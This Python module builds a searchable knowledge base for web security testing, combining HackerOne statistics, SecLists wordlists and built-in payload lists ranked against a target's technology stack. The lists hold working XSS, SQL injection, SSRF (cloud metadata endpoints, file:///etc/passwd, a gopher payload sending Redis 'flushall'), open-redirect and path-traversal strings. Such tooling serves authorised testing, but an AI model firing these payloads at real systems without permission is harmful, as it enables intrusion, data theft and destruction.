#!/usr/bin/env python3
"""
Knowledge Base Integration System
Provides unified access to HackerOne reports, PayloadsAllTheThings, and SecLists
"""

import json
import sqlite3
import logging
import re
from pathlib import Path
from typing import List, Dict, Optional, Any, Tuple
from dataclasses import dataclass
from datetime import datetime

logger = logging.getLogger(__name__)

@dataclass
class KnowledgeDoc:
    """Unified knowledge document structure"""
    id: str
    title: str
    type: str  # 'h1_report', 'payload_family', 'seclist', 'cve'
    category: str  # vuln class like 'xss', 'sqli', 'ssrf'
    content: str
    payloads: List[str]
    metadata: Dict[str, Any]
    relevance_score: float = 0.0

class KnowledgeBaseRetriever:
    """
    Unified knowledge base retrieval system with FTS and semantic ranking.
    Integrates HackerOne disclosed PoCs, PayloadsAllTheThings, and SecLists.
    """
    
    def __init__(self, base_dir: Path = None):
        self.base_dir = base_dir or Path(__file__).parent
        self.db_path = self.base_dir / "knowledge.db"
        self.h1_dir = self.base_dir / "ultimate_payloads"
        self.seclists_dir = Path.home() / "SecLists"  # Common location
        
        self._ensure_db()
        self._load_knowledge_sources()
    
    def _ensure_db(self):
        """Create knowledge database with FTS support"""
        with sqlite3.connect(self.db_path) as db:
            # Main knowledge documents table
            db.execute("""
                CREATE TABLE IF NOT EXISTS knowledge_docs (
                    id TEXT PRIMARY KEY,
                    title TEXT,
                    type TEXT,
                    category TEXT,
                    content TEXT,
                    payloads TEXT,  -- JSON array
                    metadata TEXT,  -- JSON object
                    created_at TEXT,
                    stack_signals TEXT,  -- Technology indicators
                    severity TEXT,
                    cwe TEXT
                )
            """)
            
            # FTS5 virtual table for fast text search
            db.execute("""
                CREATE VIRTUAL TABLE IF NOT EXISTS knowledge_fts USING fts5(
                    id,
                    title,
                    category,
                    content,
                    payloads,
                    stack_signals,
                    content=knowledge_docs,
                    content_rowid=rowid
                )
            """)
            
            # Triggers to keep FTS in sync
            db.execute("""
                CREATE TRIGGER IF NOT EXISTS knowledge_ai AFTER INSERT ON knowledge_docs BEGIN
                    INSERT INTO knowledge_fts(rowid, id, title, category, content, payloads, stack_signals)
                    VALUES (new.rowid, new.id, new.title, new.category, new.content, new.payloads, new.stack_signals);
                END
            """)
            
            db.execute("""
                CREATE TRIGGER IF NOT EXISTS knowledge_ad AFTER DELETE ON knowledge_docs BEGIN
                    INSERT INTO knowledge_fts(knowledge_fts, rowid, id, title, category, content, payloads, stack_signals)
                    VALUES ('delete', old.rowid, old.id, old.title, old.category, old.content, old.payloads, old.stack_signals);
                END
            """)
            
            db.execute("""
                CREATE TRIGGER IF NOT EXISTS knowledge_au AFTER UPDATE ON knowledge_docs BEGIN
                    INSERT INTO knowledge_fts(knowledge_fts, rowid, id, title, category, content, payloads, stack_signals)
                    VALUES ('delete', old.rowid, old.id, old.title, old.category, old.content, old.payloads, old.stack_signals);
                    INSERT INTO knowledge_fts(rowid, id, title, category, content, payloads, stack_signals)
                    VALUES (new.rowid, new.id, new.title, new.category, new.content, new.payloads, new.stack_signals);
                END
            """)
    
    def _load_knowledge_sources(self):
        """Load and index knowledge from all sources"""
        try:
            self._load_h1_reports()
            self._create_payload_families()
            self._index_seclists()
            logger.info("Knowledge base loaded successfully")
        except Exception as e:
            logger.error(f"Error loading knowledge sources: {e}")
    
    def _load_h1_reports(self):
        """Load HackerOne intelligence data"""
        try:
            h1_intel_path = self.h1_dir / "h1_intelligence.json"
            h1_payloads_path = self.h1_dir / "hackerone_payloads_by_category.json"
            
            if not h1_intel_path.exists():
                logger.warning(f"HackerOne intelligence file not found: {h1_intel_path}")
                return
            
            with open(h1_intel_path) as f:
                h1_data = json.load(f)
            
            # Load HackerOne payloads if available
            h1_payloads = {}
            if h1_payloads_path.exists():
                with open(h1_payloads_path) as f:
                    h1_payloads = json.load(f)
            
            with sqlite3.connect(self.db_path) as db:
                # Clear existing H1 data
                db.execute("DELETE FROM knowledge_docs WHERE type = 'h1_report'")
                
                # Process vulnerability statistics
                if 'vulnerability_statistics' in h1_data:
                    stats = h1_data['vulnerability_statistics']
                    for vuln_type, count in stats.items():
                        category = self._normalize_vuln_category(vuln_type)
                        payloads_for_type = h1_payloads.get(vuln_type, [])
                        
                        doc = {
                            'id': f'h1_stats_{vuln_type}',
                            'title': f'HackerOne {vuln_type} Statistics',
                            'type': 'h1_report',
                            'category': category,
                            'content': f'HackerOne reports: {count} instances of {vuln_type}',
                            'payloads': json.dumps(payloads_for_type[:20]),  # Top 20 payloads
                            'metadata': json.dumps({
                                'report_count': count,
                                'source': 'hackerone_statistics',
                                'vuln_type': vuln_type
                            }),
                            'created_at': datetime.now().isoformat(),
                            'stack_signals': '',
                            'severity': self._infer_severity_from_count(count),
                            'cwe': self._vuln_type_to_cwe(vuln_type)
                        }
                        
                        db.execute("""
                            INSERT OR REPLACE INTO knowledge_docs 
                            (id, title, type, category, content, payloads, metadata, created_at, stack_signals, severity, cwe)
                            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                        """, tuple(doc.values()))
                
                db.commit()
                logger.info(f"Loaded {len(stats)} HackerOne vulnerability statistics")
                
        except Exception as e:
            logger.error(f"Error loading HackerOne reports: {e}")
    
    def _create_payload_families(self):
        """Create PayloadsAllTheThings-style payload families"""
        payload_families = {
            'xss': {
                'html_context': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    '<svg onload=alert("XSS")>',
                    '<iframe src="javascript:alert(\'XSS\')">',
                    '<body onload=alert("XSS")>',
                    '<input onfocus=alert("XSS") autofocus>',
                ],
                'attribute_context': [
                    '" onmouseover="alert(\'XSS\')"',
                    '\' onmouseover=\'alert("XSS")\'',
                    'javascript:alert("XSS")',
                    'data:text/html,<script>alert("XSS")</script>',
                ],
                'javascript_context': [
                    '\';alert("XSS");//',
                    '\";alert("XSS");//',
                    '}-alert("XSS")-{',
                    '</script><script>alert("XSS")</script>',
                ],
                'dom_based': [
                    'javascript:alert(document.domain)',
                    '#<script>alert("XSS")</script>',
                    '?param=<script>alert("XSS")</script>',
                ]
            },
            'sqli': {
                'mysql': [
                    "' OR 1=1--",
                    "' UNION SELECT NULL,version(),NULL--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "') OR 1=1--",
                    "' OR 'a'='a",
                    "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                ],
                'postgresql': [
                    "' OR 1=1--",
                    "' UNION SELECT NULL,version(),NULL--",
                    "'; SELECT pg_sleep(10)--",
                    "' AND (SELECT COUNT(*) FROM pg_tables)>0--",
                ],
                'mssql': [
                    "' OR 1=1--",
                    "' UNION SELECT NULL,@@version,NULL--",
                    "'; WAITFOR DELAY '00:00:10'--",
                    "' AND (SELECT COUNT(*) FROM sys.tables)>0--",
                ],
                'blind_boolean': [
                    "' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables WHERE table_schema='database' LIMIT 1)='a'--",
                    "' AND LENGTH(database())=8--",
                    "' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>100--",
                ],
                'time_based': [
                    "' AND (SELECT SLEEP(5))--",
                    "'; SELECT pg_sleep(5)--",
                    "'; WAITFOR DELAY '00:00:05'--",
                ]
            },
            'ssrf': [
                'http://localhost/',
                'http://127.0.0.1/',
                'http://169.254.169.254/',  # AWS metadata
                'http://metadata.google.internal/',  # GCP metadata
                'file:///etc/passwd',
                'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a',
                'dict://localhost:11211/',
                'ldap://localhost:389/',
            ],
            'open_redirect': [
                'http://evil.com',
                '//evil.com',
                '/\\evil.com',
                'https:evil.com',
                'htTp://evil.com',
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
            ],
            'idor': [
                # These are more pattern-based
                'user_id=1',
                'account=2',
                'id=../../../etc/passwd',
                'file=../../../../windows/win.ini',
            ]
        }
        
        try:
            with sqlite3.connect(self.db_path) as db:
                db.execute("DELETE FROM knowledge_docs WHERE type = 'payload_family'")
                
                for category, contexts in payload_families.items():
                    if isinstance(contexts, dict):
                        for context, payloads in contexts.items():
                            doc = {
                                'id': f'payload_{category}_{context}',
                                'title': f'{category.upper()} Payloads - {context}',
                                'type': 'payload_family',
                                'category': category,
                                'content': f'{category} payloads for {context} context',
                                'payloads': json.dumps(payloads),
                                'metadata': json.dumps({'context': context, 'count': len(payloads)}),
                                'created_at': datetime.now().isoformat(),
                                'stack_signals': '',
                                'severity': 'High',
                                'cwe': self._vuln_type_to_cwe(category)
                            }
                    else:
                        # Simple list of payloads
                        doc = {
                            'id': f'payload_{category}',
                            'title': f'{category.upper()} Payloads',
                            'type': 'payload_family',
                            'category': category,
                            'content': f'{category} attack payloads',
                            'payloads': json.dumps(contexts),
                            'metadata': json.dumps({'count': len(contexts)}),
                            'created_at': datetime.now().isoformat(),
                            'stack_signals': '',
                            'severity': 'High',
                            'cwe': self._vuln_type_to_cwe(category)
                        }
                    
                    db.execute("""
                        INSERT OR REPLACE INTO knowledge_docs 
                        (id, title, type, category, content, payloads, metadata, created_at, stack_signals, severity, cwe)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    """, tuple(doc.values()))
                
                db.commit()
                logger.info("Created payload families")
                
        except Exception as e:
            logger.error(f"Error creating payload families: {e}")
    
    def _index_seclists(self):
        """Index relevant SecLists wordlists"""
        if not self.seclists_dir.exists():
            logger.warning(f"SecLists not found at {self.seclists_dir}")
            return
        
        try:
            # Key SecLists to index
            wordlists = {
                'parameters': 'Discovery/Web-Content/burp-parameter-names.txt',
                'directories': 'Discovery/Web-Content/directory-list-2.3-medium.txt',
                'files': 'Discovery/Web-Content/common.txt',
                'subdomains': 'Discovery/DNS/subdomains-top1million-20000.txt',
                'usernames': 'Usernames/top-usernames-shortlist.txt',
                'passwords': 'Passwords/Common-Credentials/10-million-password-list-top-1000.txt',
            }
            
            with sqlite3.connect(self.db_path) as db:
                db.execute("DELETE FROM knowledge_docs WHERE type = 'seclist'")
                
                for name, relative_path in wordlists.items():
                    wordlist_path = self.seclists_dir / relative_path
                    if not wordlist_path.exists():
                        continue
                    
                    # Read first 1000 lines for indexing
                    entries = []
                    try:
                        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                            entries = [line.strip() for line in f.readlines()[:1000] if line.strip()]
                    except Exception as e:
                        logger.debug(f"Error reading {wordlist_path}: {e}")
                        continue
                    
                    if not entries:
                        continue
                    
                    doc = {
                        'id': f'seclist_{name}',
                        'title': f'SecLists {name.title()}',
                        'type': 'seclist',
                        'category': name,
                        'content': f'SecLists wordlist for {name} discovery',
                        'payloads': json.dumps(entries),
                        'metadata': json.dumps({
                            'path': str(relative_path),
                            'count': len(entries),
                            'source': 'seclists'
                        }),
                        'created_at': datetime.now().isoformat(),
                        'stack_signals': '',
                        'severity': 'Info',
                        'cwe': ''
                    }
                    
                    db.execute("""
                        INSERT OR REPLACE INTO knowledge_docs 
                        (id, title, type, category, content, payloads, metadata, created_at, stack_signals, severity, cwe)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    """, tuple(doc.values()))
                
                db.commit()
                logger.info(f"Indexed {len(wordlists)} SecLists wordlists")
                
        except Exception as e:
            logger.error(f"Error indexing SecLists: {e}")
    
    def get_relevant_docs(self, query: str, fingerprint: Dict[str, Any] = None, k: int = 10) -> List[KnowledgeDoc]:
        """
        Retrieve relevant knowledge documents using FTS + fingerprint-based ranking.
        
        Args:
            query: Search query (vulnerability type, technology, etc.)
            fingerprint: Target fingerprint dict with 'stack', 'params', 'headers', etc.
            k: Number of documents to return
            
        Returns:
            List of ranked KnowledgeDoc objects
        """
        fingerprint = fingerprint or {}
        
        try:
            with sqlite3.connect(self.db_path) as db:
                # FTS search with category boost
                fts_query = self._build_fts_query(query, fingerprint)
                
                cursor = db.execute("""
                    SELECT d.*, fts.rank
                    FROM knowledge_docs d
                    JOIN knowledge_fts fts ON d.rowid = fts.rowid
                    WHERE knowledge_fts MATCH ?
                    ORDER BY fts.rank DESC
                    LIMIT ?
                """, (fts_query, k * 2))  # Get more for re-ranking
                
                docs = []
                for row in cursor.fetchall():
                    doc = KnowledgeDoc(
                        id=row[0],
                        title=row[1],
                        type=row[2],
                        category=row[3],
                        content=row[4],
                        payloads=json.loads(row[5] or '[]'),
                        metadata=json.loads(row[6] or '{}'),
                        relevance_score=float(row[-1])  # FTS rank
                    )
                    
                    # Apply fingerprint-based boost
                    doc.relevance_score *= self._calculate_fingerprint_boost(doc, fingerprint)
                    docs.append(doc)
                
                # Re-rank and return top-k
                docs.sort(key=lambda x: x.relevance_score, reverse=True)
                return docs[:k]
                
        except Exception as e:
            logger.error(f"Error retrieving relevant docs: {e}")
            return []
    
    def _build_fts_query(self, query: str, fingerprint: Dict[str, Any]) -> str:
        """Build FTS5 query with boosts"""
        # Clean and tokenize query
        query_terms = re.findall(r'\w+', query.lower())
        
        # Add technology terms from fingerprint
        tech_stack = fingerprint.get('stack', [])
        if isinstance(tech_stack, str):
            tech_stack = [tech_stack]
        
        for tech in tech_stack:
            if isinstance(tech, str):
                query_terms.extend(re.findall(r'\w+', tech.lower()))
        
        # Build FTS query with category boost
        query_parts = []
        for term in query_terms[:5]:  # Limit terms
            # Boost category matches
            query_parts.append(f'(category:{term} OR title:{term} OR content:{term})')
        
        return ' OR '.join(query_parts) if query_parts else query
    
    def _calculate_fingerprint_boost(self, doc: KnowledgeDoc, fingerprint: Dict[str, Any]) -> float:
        """Calculate relevance boost based on target fingerprint"""
        boost = 1.0
        
        # Technology stack matching
        stack = fingerprint.get('stack', [])
        if isinstance(stack, str):
            stack = [stack]
        
        stack_terms = ' '.join(stack).lower()
        doc_content = (doc.content + ' ' + doc.title).lower()
        
        # Boost for technology matches
        tech_matches = 0
        for tech in ['php', 'javascript', 'python', 'java', 'nodejs', 'react', 'angular', 'vue']:
            if tech in stack_terms and tech in doc_content:
                tech_matches += 1
        
        if tech_matches > 0:
            boost *= (1.0 + tech_matches * 0.2)
        
        # Severity-based boost
        severity_boost = {
            'critical': 1.5,
            'high': 1.3,
            'medium': 1.1,
            'low': 0.9,
            'info': 0.8
        }
        
        doc_severity = doc.metadata.get('severity', '').lower()
        if doc_severity in severity_boost:
            boost *= severity_boost[doc_severity]
        
        # Recency boost for H1 reports
        if doc.type == 'h1_report':
            report_count = doc.metadata.get('report_count', 0)
            if report_count > 100:  # Popular vulnerability
                boost *= 1.2
        
        return boost
    
    def _normalize_vuln_category(self, vuln_type: str) -> str:
        """Normalize vulnerability type to standard categories"""
        vuln_type = vuln_type.lower()
        
        if 'xss' in vuln_type:
            return 'xss'
        elif 'sql' in vuln_type:
            return 'sqli'
        elif 'ssrf' in vuln_type:
            return 'ssrf'
        elif 'redirect' in vuln_type:
            return 'open_redirect'
        elif 'idor' in vuln_type:
            return 'idor'
        elif 'csrf' in vuln_type:
            return 'csrf'
        elif 'command' in vuln_type or 'injection' in vuln_type:
            return 'command_injection'
        elif 'file' in vuln_type and ('inclusion' in vuln_type or 'lfi' in vuln_type):
            return 'lfi'
        elif 'upload' in vuln_type:
            return 'file_upload'
        else:
            return vuln_type.replace(' ', '_').replace('-', '_')
    
    def _infer_severity_from_count(self, count: int) -> str:
        """Infer severity from HackerOne report count"""
        if count > 500:
            return 'Critical'
        elif count > 200:
            return 'High'
        elif count > 50:
            return 'Medium'
        elif count > 10:
            return 'Low'
        else:
            return 'Info'
    
    def _vuln_type_to_cwe(self, vuln_type: str) -> str:
        """Map vulnerability type to CWE"""
        cwe_mapping = {
            'xss': 'CWE-79',
            'sqli': 'CWE-89',
            'ssrf': 'CWE-918',
            'open_redirect': 'CWE-601',
            'idor': 'CWE-639',
            'csrf': 'CWE-352',
            'command_injection': 'CWE-78',
            'lfi': 'CWE-22',
            'file_upload': 'CWE-434',
            'auth_bypass': 'CWE-287'
        }
        
        normalized = self._normalize_vuln_category(vuln_type)
        return cwe_mapping.get(normalized, '')

# Global instance
knowledge_base = KnowledgeBaseRetriever()

def get_relevant_docs(query: str, fingerprint: Dict[str, Any] = None, k: int = 8) -> List[KnowledgeDoc]:
    """
    Main API function for retrieving relevant knowledge documents.
    
    Args:
        query: Search query (e.g., "xss", "sqli", "ssrf")
        fingerprint: Target fingerprint with technology stack info
        k: Number of documents to return
        
    Returns:
        List of relevant KnowledgeDoc objects
    """
    return knowledge_base.get_relevant_docs(query, fingerprint, k)

if __name__ == "__main__":
    # Test the knowledge base
    logging.basicConfig(level=logging.INFO)
    
    # Test queries
    test_queries = [
        ("xss", {"stack": ["javascript", "react"]}),
        ("sql injection", {"stack": ["php", "mysql"]}),
        ("ssrf", {"stack": ["python", "django"]}),
    ]
    
    for query, fingerprint in test_queries:
        print(f"\n=== Testing: {query} with {fingerprint} ===")
        docs = get_relevant_docs(query, fingerprint, k=3)
        for doc in docs:
            print(f"- {doc.title} (score: {doc.relevance_score:.2f}, payloads: {len(doc.payloads)})")